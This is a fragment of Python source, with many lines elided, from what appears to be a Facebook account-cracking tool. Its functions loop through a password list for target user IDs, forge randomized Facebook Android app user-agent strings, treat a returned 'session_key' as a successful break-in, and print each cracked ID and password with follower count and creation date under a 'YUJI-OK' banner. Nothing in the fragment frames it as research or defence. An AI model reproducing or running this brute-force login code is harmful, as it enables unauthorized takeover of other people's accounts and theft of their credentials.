...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/301.0.0.32.170;[FBAN/Orca-Android;FBAV/386.0.0.63.174;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/396116327;FBCR/TNT;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X6820;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"
                        ...
                        if 'session_key' in po:
                                        ...
                                        statusok = f'[•] USER ID : {ids}\n[•] PASSWORD : {pas}\n[•] FB LINK : https://www.facebook.com/{ids}\n[•] FOLLOWERS : {followers(ids)}\n[•] CREATION : {joined(ids)}'
                                        cetak(nel(statusok, style='green', title=f'YUJI-OK'))
                                        oks.append(ids)
                                        ids2.append(ids)
                                        break
                        elif twf in str(po):
...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/194.0.0.75.182;[FBAN/Orca-Android;FBAV/127.0.0.44.105;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/396116327;FBCR/TNT;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X620;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"
